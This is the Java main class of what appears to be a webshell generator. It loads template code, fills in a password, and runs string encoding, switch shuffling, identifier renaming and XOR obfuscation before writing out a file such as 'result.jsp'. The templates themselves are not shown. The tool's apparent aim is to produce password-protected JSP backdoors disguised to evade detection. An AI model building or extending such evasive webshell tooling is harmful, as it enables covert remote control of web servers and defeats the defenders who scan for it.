package org.sec;

import com.beust.jcommander.JCommander;
import com.github.javaparser.StaticJavaParser;
import com.github.javaparser.ast.CompilationUnit;
import com.github.javaparser.ast.body.MethodDeclaration;
import org.sec.input.Command;
import org.sec.input.Logo;
import org.sec.module.IdentifyModule;
import org.sec.module.StringModule;
import org.sec.module.SwitchModule;
import org.sec.module.XORModule;
import org.sec.util.FileUtil;
import org.sec.util.WriteUtil;

import java.io.IOException;
import java.io.InputStream;


public class Main {
    public static void main(String[] args) throws IOException {
        Logo.PrintLogo();
        System.out.println("Wait 1 Minute ... ");

        Command command = new Command();
        JCommander jc = JCommander.newBuilder().addObject(command).build();
        jc.parse(args);
        if (command.help) {
            jc.usage();
        }
        String password = command.password;
        boolean useUnicode = command.unicode;

        if (command.javascript) {
            InputStream in = Main.class.getClassLoader().getResourceAsStream("JS.java");
            String code = FileUtil.readFile(in);
            code = code.replace("__PASSWORD__", password);
            FileUtil.writeFile("result.jsp", code);
            return;
        }

        MethodDeclaration method = getMethod("Base.java");
        MethodDeclaration decMethod = getMethod("Dec.java");

        if (method == null || decMethod == null) {
            return;
        }

        String newValue = SwitchModule.shuffle(method);
        SwitchModule.changeSwitch(method, newValue);
        int offset = StringModule.encodeString(method);
        StringModule.changeRef(method, offset);
        IdentifyModule.doIdentify(method);
        XORModule.doXOR(method);
        XORModule.doXOR(method);

        int decOffset = StringModule.encodeString(decMethod);
        StringModule.changeRef(decMethod, decOffset);
        IdentifyModule.doIdentify(decMethod);
        XORModule.doXOR(decMethod);

        WriteUtil.write(method, decMethod, password, useUnicode);
        System.out.println("Finish!");
    }

    private static MethodDeclaration getMethod(String name) throws IOException {
        InputStream in = Main.class.getClassLoader().getResourceAsStream(name);
        String code = FileUtil.readFile(in);
        CompilationUnit unit = StaticJavaParser.parse(code);
        return unit.findFirst(MethodDeclaration.class).isPresent() ?
                unit.findFirst(MethodDeclaration.class).get() : null;
    }
}

